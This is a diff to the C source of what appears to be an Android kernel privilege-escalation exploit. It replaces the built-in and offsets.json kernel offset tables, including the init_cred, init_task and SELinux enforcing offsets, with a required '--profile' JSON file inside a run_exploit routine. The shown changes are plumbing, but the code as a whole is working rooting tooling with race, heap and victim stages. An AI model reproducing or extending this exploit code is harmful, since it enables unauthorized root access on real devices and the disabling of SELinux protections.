@@ -6,7 +6,7 @@
  */
 
 #include "common.h"
-#include "offsets.h"
+#include "profile.h"
 #include <ctype.h>
 #include <sys/ioctl.h>
 #include <sys/mman.h>
@@ -69,7 +69,7 @@ static enum soc_family detect_soc(void) {
   return SOC_QCOM;
 }
 
-/* Override target.h _OFF macros with dynamic offsets from offsets.h table */
+/* Override target.h _OFF macros with the resolved runtime profile. */
 #undef SELINUX_ENFORCING_OFF
 #undef INIT_CRED_OFF
 #undef INIT_TASK_OFF
@@ -109,6 +109,8 @@ static enum soc_family detect_soc(void) {
 #endif
 #include "offsets_json.h"
 
+// TODO(decoupling:S08-profile): Replace this compatibility storage and offset
+// macros with an immutable TargetProfile passed to its consumers.
 static struct kernel_offsets g_external_offsets;
 static char g_external_release[192];
 
@@ -205,45 +207,10 @@ static void publish_active_offsets(void) {
           (size_t)g_init_cred_image, (size_t)data_addr(g_init_cred_image));
 }
 
-/* Import a matching entry from <home>/offsets.json; returns 0 and activates
- * the external table on success.  When the release is also registered in the
- * built-in table, the entry starts from the built-in values so fields the
- * JSON leaves empty keep the built-in ones instead of falling back to
- * target.h defaults. */
-/* Decoupling plan: load and merge an external profile for one release. Inputs:
- * path/config, release and built-in fallback; output: TargetProfile/result.
- * Future: target_profile_load_external(), without activating global state. */
-static int try_external_offsets(const char *release) {
-  char path[320];
-  snprintf(path, sizeof(path), "%s/offsets.json", g_home_dir);
-  const struct kernel_offsets *builtin = NULL;
-  for (int i = 0; known_offsets[i].uname_r; i++) {
-    if (strcmp(release, known_offsets[i].uname_r) == 0) {
-      builtin = &known_offsets[i];
-      break;
-    }
-  }
-  if (builtin) {
-    g_external_offsets = *builtin;
-  } else {
-    memset(&g_external_offsets, 0, sizeof(g_external_offsets));
-  }
-  int rc = load_offsets_json(path, release, &g_external_offsets,
-                             g_external_release, sizeof(g_external_release));
-  if (rc == 0) {
-    if (validate_offsets_profile(&g_external_offsets) != 0) return -1;
-    active_offsets = &g_external_offsets;
-    pr_success("offsets imported from offsets.json: %s\n",
-               active_offsets->uname_r);
-  } else {
-    pr_info("no external offsets match at %s\n", path);
-  }
-  return rc;
-}
 /* Decoupling plan: select, validate and resolve the active profile. Inputs:
  * runtime release/config; output: immutable TargetProfile. Future: split into
  * target_profile_select() and resolve_runtime_addresses(). */
-static int select_offsets(void) {
+static int select_offsets(const char *profile_path) {
   struct utsname uts;
   if (uname(&uts) < 0) return -1;
   pr_info("kernel: %s\n", uts.release);
@@ -254,26 +221,24 @@ static int select_offsets(void) {
     return -1;
   }
 #endif
-  /* Imported offsets win over the built-in tables so refreshed values take
-   * effect without rebuilding the app. */
-  if (try_external_offsets(uts.release) == 0) {
-    publish_active_offsets();
-    return 0;
+  if (!profile_path ||
+      load_resolved_profile_json(profile_path, &g_external_offsets,
+                                 g_external_release,
+                                 sizeof(g_external_release)) != 0) {
+    pr_error("cannot load resolved profile: %s\n",
+             profile_path ? profile_path : "<missing --profile>");
+    return -1;
   }
-  for (int i = 0; known_offsets[i].uname_r; i++) {
-    if (strcmp(uts.release, known_offsets[i].uname_r) == 0) {
-      active_offsets = &known_offsets[i];
-      if (validate_offsets_profile(active_offsets) != 0) return -1;
-      pr_success("offsets matched: %s\n", active_offsets->uname_r);
-      publish_active_offsets();
-      return 0;
-    }
+  if (strcmp(g_external_release, uts.release) != 0) {
+    pr_error("profile release mismatch: expected %s, got %s\n", uts.release,
+             g_external_release);
+    return -1;
   }
-  pr_error("no offsets for kernel: %s\n", uts.release);
-  pr_error("add this kernel to offsets.h and rebuild, or import a matching "
-           "offsets.json entry into %s\n",
-           g_home_dir);
-  return -1;
+  if (validate_offsets_profile(&g_external_offsets) != 0) return -1;
+  active_offsets = &g_external_offsets;
+  pr_success("resolved profile loaded: %s\n", active_offsets->uname_r);
+  publish_active_offsets();
+  return 0;
 }
 
 static struct timespec t0;
@@ -1191,7 +1156,19 @@ static int verify_leaf_dir_stage(void *context) {
  * exploit_session_run(ExploitSession *), delegating profile, heap, race, route,
  * victim and cleanup responsibilities to their contexts. */
 int run_exploit(int argc, char **argv) {
-  (void)argc; (void)argv;
+  const char *profile_path = NULL;
+  for (int i = 1; i < argc; i++) {
+    if (strcmp(argv[i], "--profile") == 0 && i + 1 < argc) {
+      profile_path = argv[++i];
+    } else {
+      pr_error("usage: %s --profile <resolved-profile.json>\n", argv[0]);
+      return 1;
+    }
+  }
+  if (!profile_path) {
+    pr_error("missing required --profile <resolved-profile.json>\n");
+    return 1;
+  }
   disable_rseq_for_thread();
   set_unbuffer();
   signal(SIGPIPE, SIG_IGN);
@@ -1204,7 +1181,7 @@ int run_exploit(int argc, char **argv) {
   runtime_config_log(&g_runtime_config);
   write_root_script();
 
-  if (!active_offsets && select_offsets() < 0) return 1;
+  if (!active_offsets && select_offsets(profile_path) < 0) return 1;
 
   apply_iomem_cache();
   log_startup_context();
